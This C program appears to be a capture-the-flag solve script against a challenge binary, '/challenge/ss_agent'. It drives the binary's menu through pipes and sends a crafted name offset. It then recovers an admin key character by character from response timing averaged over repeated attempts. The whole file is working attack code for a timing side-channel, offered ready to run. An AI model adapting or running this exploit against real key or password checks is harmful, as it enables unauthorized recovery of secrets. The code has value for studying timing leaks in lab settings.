#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <unistd.h>
#include <time.h>
#include <assert.h>
 
struct timespec start_time, end_time;
clock_t start_t, end_t;

char buf[0x10000];

int recvuntil(int fd, char* needle) {
    int cnt = 0;
    while(1) {
        int cur = read(fd, buf+cnt, 4096);
        assert(cur != -1);
        cnt += cur;
        buf[cnt] = 0;
        if (strstr(buf, needle) != NULL) {
            break;
        }
    }
    buf[cnt] = '\0';
    return cnt;
}

void readn(int fd, int n) {
    int cnt = 0;
    while (cnt != n) {
        int cur = read(fd, buf+cnt, n-cnt);
        assert(cur != -1);
        cnt += cur;
    }
    buf[cnt] = 0;
}

int main(int argc, char *argv[])
{
    char key[] = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n";
    const char *charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

    int key_i;
    if (argc == 1) {
        key_i = 0;
    }
    else {
        key_i = strlen(argv[1]);
    }
    for(int i = 0; i < key_i; i++) {
        key[i] = argv[1][i];
    }

    // create two pipes:
    // - parent_fds used by parent to write to child
    // - child_fds used by child to write to parent
    int parent_fds[2], child_fds[2];

    // read:[0] - write:[1]
    if (pipe(parent_fds) != 0 || pipe(child_fds) != 0)  /* || not && */
    {
        fprintf(stderr, "pipes failed!\n");
        return EXIT_FAILURE;
    }

    // fork() child process
    int child = fork();

    if (child < 0)
    {
        fprintf(stderr, "fork failed!");
        return EXIT_FAILURE;
    }
    else if (child == 0)
    {
        printf("%d: I reached the child :)\n", (int)getpid());
        // close unwanted pipe ends by child
        close(child_fds[0]);
        close(parent_fds[1]);

        dup2(parent_fds[0], 0);
        close(parent_fds[0]);

        dup2(child_fds[1], 1);
        close(child_fds[1]);

        char* prog = "/challenge/ss_agent";

        execl(prog, prog, NULL);
        exit(0);
    }
    else
    {
        // close unwanted pipe ends by parent
        close(parent_fds[0]);
        close(child_fds[1]);

        int inp = parent_fds[1];
        int out = child_fds[0];
        int cnt;

        recvuntil(out, "choice:\n");
        printf("%s", buf);
        dprintf(inp, "1\n");

        int offset = 4087 - key_i;

        recvuntil(out, "name ?\n");
        printf("%s", buf);
        dprintf(inp, "%d\n", offset);

        recvuntil(out, "name ?\n");
        printf("%s", buf);
        dprintf(inp, "A\n");

        recvuntil(out, "Hello ");
        read(out, buf, offset);


        for (int t = 0; t < strlen(charset); t++) {
            const int ITERS = 30;
            long long total = 0;
            for (int iter = 0; iter < ITERS; iter++) {
                cnt = recvuntil(out, "choice:\n");
                // printf("FUCK|||\n%s", buf);
                dprintf(inp, "4\n");

                key[key_i] = charset[t];

                cnt = recvuntil(out, "admin key:\n");
                // printf("BEGIN|||\n%s", buf);
                assert(strstr(buf, "admin key") != NULL);

                write(inp, key, 33);
                readn(out, 12);
                // printf("Part 1 - %s\n", buf);
                readn(out, 17);
                buf[17] = 0;
                // printf("Part 2 - %s\n", buf);

                clock_gettime(CLOCK_REALTIME, &start_time);
                cnt = read(out, buf, 1);
                clock_gettime(CLOCK_REALTIME, &end_time);
                // printf("%d %d\n", cnt, buf[0]);
                assert(buf[0] == 0xA);

                long long diffInNanos = ((end_time.tv_sec - start_time.tv_sec) * (long long)1e9) + (end_time.tv_nsec - start_time.tv_nsec);
                total += diffInNanos;
            }
            printf("%c - %lld\n", charset[t], total/ITERS);
        }

        exit(1);
    }

    int corpse;
    int status;
    while ((corpse = wait(&status)) > 0)
        printf("%d: child PID %d exited with status 0x%.4X\n", (int)getpid(), corpse, status);

    return EXIT_SUCCESS;
}
